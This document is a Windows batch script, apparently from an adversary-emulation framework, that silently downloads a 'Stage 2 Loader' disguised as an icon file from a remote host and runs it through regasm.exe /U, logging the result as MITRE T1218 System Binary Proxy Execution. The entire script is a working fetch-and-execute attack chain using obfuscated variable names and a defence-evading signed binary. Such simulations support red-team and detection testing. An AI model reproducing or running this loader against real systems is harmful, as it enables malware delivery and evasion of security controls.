@echo off
setlocal enabledelayedexpansion

REM SET-var preamble: assign random variable names to each PHR_ placeholder
SET xqzwyk=ITZEL-S2B
SET bntmce=10322
SET rdfvql=7
SET hpgnos=%APPDATA%\10322\f9487b4e
SET yjztwk=9aac7ba3.txt
SET cpmqao=https://10.0.0.49/stage/2/icon.png?10322-7
SET lvnhxs=%APPDATA%\7\macula-simulations.log
SET dkgtir=%APPDATA%\7
SET fjuemr=Microsoft.Win32.TaskScheduler.NativeBridge
SET skezol=Dale
SET pawint=https://10.0.0.49

REM Compute log file path from ENDPOINT_ID
SET "logpath=%APPDATA%\!rdfvql!\macula-simulations.log"

REM Timestamp helper
for /f "tokens=1-6 delims=/:. " %%a in ("%date% %time%") do set tsvar=%%a-%%b-%%c_%%d:%%e:%%f

REM Create output directory if missing (silently)
if not exist "!hpgnos!" mkdir "!hpgnos!" 2>nul

REM Heartbeat fetch (downloads Stage 2 Loader)
echo [!tsvar!][DEBUG][!xqzwyk!][!bntmce!]: heartbeat_start >>"!logpath!" 2>nul
curl -k -s -o "!hpgnos!\!yjztwk!" "!cpmqao!"
echo [!tsvar!][DEBUG][!xqzwyk!][!bntmce!]: heartbeat_complete >>"!logpath!" 2>nul

REM Change directory to output location
cd /d "!hpgnos!"
echo [!tsvar!][DEBUG][!xqzwyk!][!bntmce!]: chdir_result=!errorlevel! >>"!logpath!" 2>nul

REM LOLBIN start debug
echo [!tsvar!][DEBUG][!xqzwyk!][!bntmce!]: lolbin_start >>"!logpath!" 2>nul

REM Execute the downloaded Stage 2 Loader via RegAsm /U
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U "!hpgnos!\!yjztwk!"
set "lolbin_err=!errorlevel!"

REM TTP completion log for T1218 System Binary Proxy Execution
if !lolbin_err! equ 0 (
    echo [!tsvar!][TTP][!xqzwyk!][!bntmce!]: T1218^|System Binary Proxy Execution=[OK]:[] >>"!logpath!" 2>nul
) else (
    echo [!tsvar!][TTP][!xqzwyk!][!bntmce!]: T1218^|System Binary Proxy Execution=[FAIL]:[lolbin_execution_failed] >>"!logpath!" 2>nul
)

endlocal